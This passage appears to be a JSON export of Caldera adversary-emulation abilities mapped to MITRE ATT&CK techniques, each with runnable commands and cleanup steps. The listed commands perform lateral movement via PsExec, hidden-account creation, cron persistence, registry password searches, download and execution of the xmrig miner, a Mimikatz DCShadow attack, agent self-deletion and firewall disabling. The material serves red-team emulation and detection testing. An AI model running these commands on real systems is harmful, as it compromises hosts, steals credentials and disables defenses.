        "privilege": "",
        "technique_name": "Lateral Tool Transfer",
        "technique_id": "T1570",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "sandcat.go-windows"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Copy Sandcat file using PsExec on CMD",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Copy Sandcat File using PsExec on CMD",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "dedfa0a54c9c13ce5714a0dc2e1f5d1a",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "technique_id": "T1564",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "net user $ /DELETE 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net user $ ATOMIC123! /add /active:yes",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creating a user with a username containing \"$\"",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Create a Hidden User Called \"$\"",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e727eb66-c10e-4dba-92d9-41b62b8bd595",
        "buckets": [],
        "privilege": "",
        "technique_name": "Create Account: Local Account Linux",
        "technique_id": "T1136.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "userdel evil_user"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "Create a user via useradd",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "Create a user account on a Linux system",
        "tactic": "persistence",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "83a5ad479c9e313e60f34380e193102a",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "technique_id": "T1564",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "New-LocalUser -Name \"Administrator \" -NoPassword",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creating a user with a username containing with a space on the end",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Create an \"Administrator \" user (with a space on the end)",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ed335269c049080700b57add9ba733fb",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Run Virtual Instance",
        "technique_id": "T1564.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Stop-VM $VM -Force; Remove-VM $VM -Force"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = \"Atomic VM\"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Create and start Hyper-V virtual machine",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "355aef8ac8f57f9d407c018439e7285d",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Run Virtual Instance",
        "technique_id": "T1564.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" controlvm \"Atomic VM\" poweroff && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" unregistervm \"Atomic VM\" --delete"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" createvm --name \"Atomic VM\" --register && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" modifyvm \"Atomic VM\" --firmware efi && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" startvm \"Atomic VM\"",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Create and start VirtualBox virtual machine",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "technique_id": "T1074.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm -rf staged"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "mkdir -p staged && echo $PWD/staged",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm -rf staged"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "mkdir -p staged && echo $PWD/staged",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Path \"staged\" -recurse"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Path \"staged\" -recurse"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
                "name": "pwsh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "create a directory for exfil staging",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Create staging directory",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3aad5312-d48b-4206-9de4-39866c12e60f",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials in Registry",
        "technique_id": "T1552.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg query HKCU /f password /t REG_SZ /s",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Search for possible credentials stored in Registry",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Credentials in Registry - HKCU",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "98e58fc4-3843-4511-89b1-50cb872e0c9b",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials in Registry",
        "technique_id": "T1552.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg query HKLM /f password /t REG_SZ /s",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Search for possible credentials stored in the HKLM Hive",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Credentials in Registry - HKLM",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a32285665fbf7a2cd5e3a15af8c41968",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Cron",
        "technique_id": "T1053.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /var/spool/cron/crontabs/persistevil"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Cron - Add script to /var/spool/cron/crontabs/ folder",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "fc376eb4b41fdc72ffd27cd6e6d4041b",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Cron",
        "technique_id": "T1053.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /etc/cron.daily/persistevil; rm /etc/cron.hourly/persistevil; rm /etc/cron.monthly/persistevil; rm /etc/cron.weekly/persistevil"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm /etc/cron.daily/persistevil; rm /etc/cron.hourly/persistevil; rm /etc/cron.monthly/persistevil; rm /etc/cron.weekly/persistevil"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Cron - Add script to all cron subfolders",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "603583ec6e53431838a011ca2e7ece77",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Cron",
        "technique_id": "T1053.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "crontab /tmp/notevil"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "crontab /tmp/notevil"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Cron - Replace crontab with referenced file",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "46da2385-cf37-49cb-ba4b-a739c7a19de4",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "technique_id": "T1496",
        "executors": [
            {
                "timeout": 120,
                "cleanup": [
                    "rm -rf ./xmrig*;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 120,
                "cleanup": [
                    "rm -rf ./xmrig*;"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "curl -OL https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-macos-x64.tar.gz;\ntar -xf xmrig-6.11.2-macos-x64.tar.gz;\nscreen -S miner -dm ./xmrig-6.11.2/xmrig;\nsleep 60s;\nkillall xmrig;\nscreen -S miner -X quit",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 120,
                "cleanup": [
                    "rm ./xmrig* -r -fo;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;\nExpand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\\;\nStart-Process \".\\xmrig-6.11.2\\xmrig.exe\" -WindowStyle Hidden;\nStart-Sleep -Seconds 60;\nStop-Process -Name \"xmrig\"",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download and execute Monero miner (xmrig) for 1 minute",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Crypto (Monero) Mining",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "whoami",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "whoami",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "whoami",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Obtain user from current session",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Current User",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ef5db0bcd87583e711535d6ffb667823",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Rogue Domain Controller",
        "technique_id": "T1207",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$dc_output_file = \"$env:TEMP\\art-T1207-mimikatz-DC.log\"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam\"; Start-Sleep -Seconds 5; &; Write-Host \"`nWaiting for fake DC server to return\"; Wait-Process $dc; Write-Host \"`nOutput from fake DC server:\"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host \"End of DCShadow\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "DCShadow (Active Directory)",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3e5501f6e01b6ea1ebeb8125f0d92217",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Data Transfer Size Limits",
        "technique_id": "T1030",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi; cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi; cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Take a file/directory, split it into 5Mb chunks\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Data Transfer Size Limits",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "technique_id": "T1070.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Deadman ability to delete agent file after termination.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Deadman - Delete agent file",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4cd4eb44-29a7-4259-91ae-e457b283a880",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "technique_id": "T1070.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{payload}"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": null,
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{payload}"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": null,
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Force -Path \"#{payload}\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": null,
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Force -Path \"#{payload}\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": null,
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Remove a downloaded payload file",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Delete payload",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1f91076e2be2014cc7b4f1296de02fd6",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "technique_id": "T1070.005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f && reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled and is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Disable Administrative Share Creation at Startup",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5b93df032e230056c21a3e57334f77d1",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "netsh advfirewall set currentprofile state on >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netsh advfirewall set currentprofile state off",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Disable Microsoft Defender Firewall",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8fe59e288f10a486dc8b44bc872019ff",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
